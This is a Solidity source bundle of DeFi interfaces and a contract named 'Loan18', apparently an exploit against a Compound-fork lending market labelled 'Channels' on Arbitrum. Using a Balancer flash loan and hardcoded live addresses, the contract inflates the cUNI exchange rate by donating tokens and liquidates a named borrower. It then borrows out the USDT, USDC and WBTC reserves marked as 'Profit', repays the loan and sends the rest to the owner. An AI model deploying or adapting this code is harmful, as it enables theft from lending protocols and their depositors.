// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.20;

import {IERC20} from "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IFlashLoanRecipient} from './IFlashLoanRecipient.sol';

interface IBalancer {
    function flashLoan(
        IFlashLoanRecipient recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IFlashLoanRecipient {
    /**
     * @dev When `flashLoan` is called on the Vault, it invokes the `receiveFlashLoan` hook on the recipient.
     *
     * At the time of the call, the Vault will have transferred `amounts` for `tokens` to the recipient. Before this
     * call returns, the recipient must have transferred `amounts` plus `feeAmounts` for each token back to the
     * Vault, or else the entire flash loan will revert.
     *
     * `userData` is the same value passed in the `IVault.flashLoan` call.
     */
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IComptroller {
    function closeFactorMantissa() external view returns (uint);

    function closeFactor() external view returns (uint);

    function enterMarkets(address[] memory) external;

    function enterMarkets(address[] memory, address) external;

    function enterMarkets(address, address) external;

    function exitMarket(address cTokenAddress) external returns (uint256);

    function exitMarkets(address[] memory) external returns (uint256);

    // function mintAllowed(address dToken, address minter) external returns (uint256);

    function mintAllowed(address dToken, address minter, uint) external returns (bool, string memory);

    // function redeemAllowed(address jToken, address redeemer, uint256 redeemTokens) external returns (uint256);

    function redeemAllowed(address jToken, address redeemer, uint256 redeemTokens) external returns (uint);

    function allMarkets() external view returns (address[] memory);

    function getAllMarkets() external view returns (address[] memory);

    function getMarketList() external view returns (address[] memory);

    function getAlliTokens() external view returns (address[] memory);

    function isBorrowPaused(address) external view returns (bool);

    function isMintPaused(address) external view returns (bool);

    function isPauseGuardian(address) external view returns (bool);

    function borrowGuardianPaused(address) external view returns (bool);

    function mintGuardianPaused(address) external view returns (bool);

    function guardianPaused(address) external view returns (bool);

    function pTokenBorrowGuardianPaused(address) external view returns (bool);

    function pTokenMintGuardianPaused(address) external view returns (bool);

    function isDeprecated(address) external view returns (bool);

    function borrowAllowed(address, address, uint) external view returns (uint);

    // function markets(address) external view returns (bool, uint256, bool);

    function markets(address) external view returns (bool, uint256);

    function tokenConfigs(address) external view returns (bool, bool, bool, bool, bool);

    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);

    // function getAccountLiquidity(address account, bool) external view returns (uint256, uint256, uint256);

    function liquidateBorrowAllowed(
        address cTokenBorrowed,
        address cTokenCollateral,
        address liquidator,
        address borrower,
        uint repayAmount
    ) external returns (uint);

    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint actualRepayAmount
    ) external view returns (uint, uint);

    function oracle() external view returns (address);

    function admin() external view returns (address);

    function owner() external view returns (address);

    function liquidationIncentiveMantissa() external view returns (uint);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import '@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol';

interface ICToken is IERC20Metadata {
    function admin() external view returns (address);

    function accrueInterest() external returns (uint256);

    function mint() external payable;

    function mint(uint256 mintAmount) external returns (uint256);

    function mint(uint256 mintAmount, bool enterMarket) external returns (uint256);

    function mint(address recipient, uint256 mintAmount) external returns (uint256);

    // function mintForSelfAndEnterMarket(uint256) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function borrowBehalf(address, uint256) external;

    function borrowNative(uint256 borrowAmount) external returns (uint256);

    function repayBorrow(uint repayAmount) external returns (uint);

    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint);

    function redeem(uint256 redeemTokens) external returns (uint);

    // function redeem(uint256 redeemTokens) external returns (uint256);

    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);

    function borrowBalanceStored(address account) external view returns (uint256);

    function comptroller() external view returns (address);

    function interestRateModel() external view returns (address);

    function borrowRatePerBlock() external view returns (uint);

    function exchangeRateStored() external view returns (uint256);

    function exchangeRateCurrent() external returns (uint256);

    function underlying() external view returns (address);

    function totalSupply() external view returns (uint256);

    function totalBorrows() external view returns (uint256);

    function totalReserves() external view returns (uint256);

    function getCash() external view returns (uint256);

    function accrualBlockNumber() external view returns (uint256);

    function reserveFactorMantissa() external view returns (uint);

    function liquidateBorrow(address borrower, uint amount, address collateral) external returns (uint);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IOracle {
    function getUnderlyingPrice(address) external view returns (uint);
}

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external view returns (address);

    function getAmountsIn(uint256 amountOut, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

import '../interfaces/balancer/IBalancer.sol';
import '../interfaces/balancer/IFlashLoanRecipient.sol';
import '../interfaces/comp/IOracle.sol';
import '../interfaces/comp/ICToken.sol';
import '../interfaces/comp/IComptroller.sol';

import '../interfaces/uniswap/IUniswapV2Router.sol';

// import 'hardhat/console.sol';

// Channels Arbi
contract Loan18 is IFlashLoanRecipient {
    IBalancer constant vault = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router constant router = IUniswapV2Router(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506); // sushi router

    IComptroller constant tenderComp = IComptroller(0xeed247Ba513A8D6f78BE9318399f5eD1a4808F8e);
    ICToken constant tUNI = ICToken(0x8b44D3D286C64C8aAA5d445cFAbF7a6F4e2B3A71);
    ICToken constant tUSDC = ICToken(0x068485a0f964B4c3D395059a19A05a8741c48B4E);

    IComptroller constant comptroller = IComptroller(0x3C13b172bf8BE5b873EB38553feC50F78c826284);
    IOracle constant oracle = IOracle(0x1d47F4A95Db7A3fC4141b5386AB06fde6367fd12);
    ICToken constant cUNI = ICToken(0xaB06f920da5C07c184cd39D2f9907D788654013E); // Collateral Factor 60%
    ICToken constant cUSDT = ICToken(0x92F6AA3d3d4b46f5e99a26984B4112c7Faa0C96c);
    ICToken constant cUSDC = ICToken(0xce8Fa238383bC3036aBE3410D7D630C7692Eb6D7);
    ICToken constant cWETH = ICToken(0x0Ddf298FB7fd115fddB714EB722F8be5Dc238C78);
    ICToken constant cWBTC = ICToken(0x1b1740085C04286a318ae47400a3561b890979C7);
    IERC20 constant UNI = IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    address constant borrower = 0xD1edDE2FFAC4bc901b7E7a817Af126C2Ef332a27;
    address immutable owner;

    error PriceNotDefined(uint price);

    constructor() {
        owner = msg.sender;
    }

    function start(address[] memory tokens, uint256[] memory amounts) external {
        // console.log('BlockNumber:', block.number);
        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, new bytes(0));
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory amounts, uint256[] memory, bytes memory) external {
        // Borrow UNI(ARB) from Tender Finance
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(tUSDC);
        tenderComp.enterMarkets(cTokens);

        USDC.approve(address(tUSDC), type(uint).max);
        tUSDC.mint(1e6 * 100000);
        tUNI.borrow(1e18 * 4500);

        uint uniPrice = oracle.getUnderlyingPrice(address(cUNI));
        uint usdcPrice = oracle.getUnderlyingPrice(address(cUSDC));

        UNI.transfer(address(cUNI), 5e18);
        cUNI.accrueInterest();
        cUSDC.accrueInterest();

        uint exR = ((cUSDC.borrowBalanceStored(borrower) / 2) *
            usdcPrice *
            comptroller.liquidationIncentiveMantissa()) /
            uniPrice /
            cUNI.balanceOf(borrower);
        // console.log('Ex:', exR);

        // console.log(
        //     (exR * cUNI.totalSupply()) / 1e18,
        //     cUNI.totalReserves(),
        //     cUNI.totalBorrows(),
        //     UNI.balanceOf(address(cUNI))
        // );
        uint transferAmount = ((exR * cUNI.totalSupply()) / 1e18) +
            cUNI.totalReserves() -
            cUNI.totalBorrows() -
            UNI.balanceOf(address(cUNI));
        // console.log('TransferAmount:', transferAmount);

        UNI.transfer(address(cUNI), transferAmount);
        cUNI.accrueInterest();

        USDC.approve(address(cUSDC), type(uint).max);
        cUSDC.liquidateBorrow(borrower, cUSDC.borrowBalanceStored(borrower) / 2, address(cUNI));
        // console.log('Left cUNI Bal:', cUNI.balanceOf(borrower));

        UNI.approve(address(cUNI), type(uint).max);
        cUNI.repayBorrowBehalf(borrower, cUNI.borrowBalanceStored(borrower));
        uint delta = cUNI.totalBorrows() - cUNI.totalReserves();
        cUNI.repayBorrowBehalf(0xFF16d64179A02D6a56a1183A28f1D6293646E2dd, delta);
        cUNI.redeem(cUNI.balanceOf(address(this)));

        cTokens[0] = address(cUNI);
        comptroller.enterMarkets(cTokens);

        // Prepare cUNI Collateral
        UNI.transfer(address(cUNI), 1);
        uint uniBal = UNI.balanceOf(address(this));
        cUNI.mint(uniBal);
        cUNI.redeem(cUNI.balanceOf(address(this)) - 2);
        UNI.transfer(address(cUNI), UNI.balanceOf(address(this)));

        // Borrow USDT, USDC, WBTC (Profit)
        USDT.transfer(address(cUSDT), 100e6);
        cUSDT.borrow(USDT.balanceOf(address(cUSDT)));
        cUSDC.borrow(USDC.balanceOf(address(cUSDC)));
        cWBTC.borrow(0.035e8);
        cUNI.redeemUnderlying(uniBal);

        // Redeem USDC from Tender
        UNI.approve(address(tUNI), type(uint).max);
        tUNI.repayBorrow(1e18 * 4500);
        tUSDC.redeemUnderlying(1e6 * 100000);

        // Swap USDT, WBTC to USDC
        address[] memory path = new address[](3);
        path[0] = address(USDT);
        path[1] = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1; // WETH
        path[2] = address(USDC);

        USDT.approve(address(router), type(uint).max);
        router.swapExactTokensForTokens(
            USDT.balanceOf(address(this)) - amounts[0],
            0,
            path,
            address(this),
            block.timestamp + 100
        );

        path[0] = address(WBTC);
        WBTC.approve(address(router), type(uint).max);
        router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100);

        // Repay Loan
        USDT.transfer(address(vault), amounts[0]);
        USDC.transfer(address(vault), amounts[1]);

        // Withdraw
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}